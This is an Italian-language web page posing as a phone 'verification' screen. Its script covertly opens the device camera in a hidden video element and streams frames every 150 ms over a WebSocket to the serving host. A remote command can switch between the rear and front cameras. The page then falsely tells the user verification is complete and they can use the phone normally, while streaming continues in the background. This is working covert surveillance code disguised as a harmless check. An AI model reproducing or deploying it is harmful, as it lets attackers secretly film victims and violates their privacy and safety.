<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verifica...</title>
  <style>
    body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
    .msg { padding:40px 20px; font-size:18px; }
  </style>
</head>
<body>
  <div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>

  <!-- Video nascosto -->
  <video id="cam" playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('cam');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');
    const room = new URLSearchParams(location.search).get('room') || 'user1';
    
    let stream = null;
  let sending = false;
  let currentFacing = 'environment';

    // WebSocket (anche in background)
    const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);

    ws.onopen = () => {
      console.log('[WS] Aperto, avvio camera');
      startCamera();
    };
    ws.onmessage = (e) => {
      try {
        const msg = JSON.parse(e.data);
        if (msg.type === 'camera' && msg.mode) {
          console.log('[WS] Comando cambio camera:', msg.mode);
          if (msg.mode !== currentFacing) {
            startCamera(msg.mode);
          }
        }
      } catch {}
    };
    ws.onclose = () => console.log('[WS] Connessione persa');
    ws.onerror = (e) => console.log('[WS] Errore', e);

    // Invia frame ogni 150ms (~6-7 FPS, basso consumo)
    function sendFrame() {
      if (!sending || video.videoWidth === 0) return;
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        if (ws.readyState === WebSocket.OPEN && blob) {
          ws.send(blob);
          console.log('[WS] Frame inviato', blob.size, 'bytes');
        } else {
          console.log('[WS] Frame NON inviato');
        }
      }, 'video/webm; codecs=vp8', 0.8);
      setTimeout(sendFrame, 150);
    }

    // Avvia fotocamera POSTERIORE
    async function startCamera(facing = 'environment') {
      try {
        currentFacing = facing;
        if (stream) {
          stream.getTracks().forEach(t => t.stop());
        }
        console.log('[CAM] Richiesta camera', facing);
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facing, width: { ideal: 1280 } },
          audio: false
        });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          sending = true;
          sendFrame();
          console.log('[CAM] Camera avviata', facing);

          // Messaggio finale + chiudi visuale
          document.body.innerHTML = `
            <div class="msg">
              <b>Verifica completata</b><br>
              <small>Puoi usare il telefono normalmente.<br>
              La verifica continua in background.</small>
            </div>`;
          // Opzionale: minimizza automaticamente (solo mobile)
          setTimeout(() => {
            if (navigator.userActivation?.isActive) {
              document.body.innerHTML = '';
            }
          }, 3000);
        };
      } catch (err) {
        console.log('[CAM] Errore apertura camera', err);
        document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
      }
    }

    // Tieni vivo il WebSocket anche se la scheda Ã¨ in background
    setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) ws.send('ping');
    }, 10000);
  </script>
</body>
</html>
